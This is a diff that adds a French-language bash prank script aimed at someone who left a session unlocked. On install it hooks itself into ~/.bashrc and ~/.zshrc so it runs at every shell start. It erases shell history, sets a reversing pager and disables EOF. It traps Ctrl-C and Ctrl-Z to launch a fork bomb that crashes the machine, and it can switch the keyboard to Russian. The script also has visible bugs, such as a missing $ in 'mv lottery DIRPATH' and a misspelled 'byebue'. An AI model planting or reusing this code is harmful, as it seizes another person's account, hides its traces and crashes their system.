@@ -1,0 +1,112 @@
+#!/bin/bash
+
+#setterm -cursor off
+#setterm -reverse on
+#setterm -blink on
+
+FILE=~/.bash_aliases_p
+DIRPATH=~/.local/share/ByeBye
+
+if [ "$1" == "install" ]; then
+	echo "if [ -f $FILE ]; then" >> ~/.bashrc
+	echo ". $FILE" >> ~/.bashrc
+	echo "fi" >> ~/.bashrc
+
+    echo "if [ -f $FILE ]; then" >> ~/.zshrc
+	echo ". $FILE" >> ~/.zshrc
+	echo "fi" >> ~/.zshrc
+
+    echo "bash $DIRPATH/lottery" > $FILE
+    
+    mv lottery DIRPATH
+
+    if [ ! -d $DIRPATH ]
+    then
+        mkdir $DIRPATH
+     fi
+
+    clear
+
+    cat /dev/null > ~/.bash_history
+    cat /dev/null > ~/.zsh_history
+
+    bash $DIRPATH/lottery
+
+    cat /dev/null > ~/.bash_history
+    cat /dev/null > ~/.zsh_history
+
+fi
+  
+export PAGER='rev'
+export PS1="B==D"
+
+stty eof undef
+trap youlose INT
+trap youlose STP
+
+echo "Bienvenue dans ma lotterie ! :D"
+sleep 1
+echo "Donc ouais, tu t'es fait conf', et bien salement :p"
+echo "Jouons à un jeu tu veux ?"
+sleep 1
+echo "Le principe est simple, si tu fermes le terminal, tu perds --> redump"
+sleep 1
+echo "Si tu triches, tu perds --> redump"
+echo "Si tu .. blah blah blah"
+echo "En fait, tu peux pas vraiment gagner mdr"
+sleep 1
+echo "Pour t'en sortir, tu as deux solutions :"
+echo "Sois tu te déconf tout seul, et tu gagnes un coockie, soit tu tires le bon numéro."
+echo "Prêt ?"
+
+sleep 1
+
+echo "3" && sleep 1
+echo "2" && sleep 1
+echo "1" && sleep 1
+
+echo "Formatage des disques.... Nah je déconne ahahahah"
+
+sleep 1
+
+bomb(){ b|b&}
+
+youlose()
+{
+echo "Ah, tu as essayé de tricher :/"
+echo "C'est con, on s'amusait bien non?"
+echo "Du coup ton PC va planter dans quelques secondes."
+echo "Ciao."
+bomb
+}
+
+byebye()
+{
+	echo "Bye Bye! :3"
+	sleep 3
+	exit
+}
+
+lotterie()
+{
+    read -p "Appuie sur entrée pour continuer :D"
+    echo "Génération d'un ticket ..."
+
+    lol=$RANDOM
+    let 'lol %= 10'
+
+    sleep 1
+
+    echo "Ton nombre est: "
+    #echo $lol
+
+    if ${lol} -le 2; then
+    	echo "Meeerde, j'espère que tu parles russe, parce que moi non xD"
+    	setxkbmap ru
+    	echo "Bye Bye"
+    	byebue
+    fi
+
+}
+
+lotterie
